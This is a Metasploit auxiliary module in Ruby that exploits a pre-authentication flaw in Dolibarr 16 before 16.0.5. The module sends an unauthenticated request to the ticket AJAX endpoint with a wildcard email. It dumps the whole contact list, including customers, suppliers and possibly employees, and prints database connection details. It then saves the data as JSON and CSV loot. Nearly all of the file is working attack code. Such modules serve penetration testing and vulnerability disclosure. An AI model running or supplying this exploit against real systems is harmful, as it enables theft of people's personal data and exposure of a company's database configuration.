##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Module::Failure

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Dolibarr 16 pre-auth contact database dump',
        'Description' => %q{
          Dolibarr version 16 < 16.0.5 is vulnerable to a pre-authentication contact database dump.
          An unauthenticated attacker may retrieve a company's entire customer file, prospects, suppliers,
          and potentially employee information if a contact file exists.
          Both public and private notes are also included in the dump.
        },
        'Author' => [
          'Vladimir TOUTAIN', 'Nolan LOSSIGNOL-DRILLIEN'
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2023-03-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'References' => [
          ['URL', 'https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/blob/16.0.5/ChangeLog#L34'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e']
        ],
        'DefaultOptions' => {
          'HttpClientTimeout' => 20
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Path to Dolibarr instance', '/'])
      ]
    )
  end

  def check_host(_ip)
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown('Connection failed') unless res
    return Exploit::CheckCode::Safe unless res.code == 200

    version = res.body.scan(/Dolibarr ([\d.]+-*[a-zA-Z0-9]*)/).flatten.first

    return Exploit::CheckCode::Detected('Dolibarr version not found - proceeding anyway...') if version.blank?

    if Rex::Version.new(version).between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
      return Exploit::CheckCode::Appears("Detected vulnerable Dolibarr version: #{version}")
    end

    return Exploit::CheckCode::Safe("Detected apparently non-vulnerable Dolibarr version: #{version}")
  end

  def run_host(ip)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/public/ticket/ajax/ajax.php'),
      'vars_get' => {
        'action' => 'getContacts',
        'email' => '%'
      }
    }, datastore['HttpClientTimeout'], true)

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response - try increasing HttpClientTimeout") if res.nil?
    fail_with(Failure::UnexpectedReply, "Exploit response code: #{res.code}") if res.code != 200

    res_json_document = res.get_json_document

    fail_with(Failure::UnexpectedReply, 'Dolibarr data did not include contacts field') if res_json_document['contacts'].blank?

    contacts = res_json_document['contacts']

    print_good("Database type: #{contacts.dig(0, 'db', 'type') || '<not found>'}")
    print_good("Database name: #{contacts.dig(0, 'db', 'database_name') || '<not found>'}")
    print_good("Database user: #{contacts.dig(0, 'db', 'database_user') || '<not found>'}")
    print_good("Database host: #{contacts.dig(0, 'db', 'database_host') || '<not found>'}")
    print_good("Database port: #{contacts.dig(0, 'db', 'database_port') || '<not found>'}")

    contact_fields = contacts[0].keys
    contact_fields.delete('db') # We do not want this in the csv

    nbr_contact = contacts.length

    path_json_file = store_loot(
      'dolibarr',
      'application/json',
      ip,
      JSON.pretty_generate(res.get_json_document),
      '.json'
    )

    print_good("Found #{nbr_contact} contacts.")
    print_good("#{rhost}:#{rport} - File saved in: #{path_json_file}")

    csv_string = CSV.generate do |csv| # Loop to write into csv
      csv << contact_fields
      contacts.each do |contact|
        csv << contact_fields.map do |element|
          if contact[element.to_s].is_a?(String) || contact[element.to_s].is_a?(Integer)
            contact[element.to_s]&.to_s&.strip || ''
          else
            ''
          end
        end
      end
    end

    path_csv_file = store_loot(
      'dolibarr',
      'application/csv',
      ip,
      csv_string,
      '.csv'
    )

    print_good("#{rhost}:#{rport} - File saved in: #{path_csv_file}")
  end

end
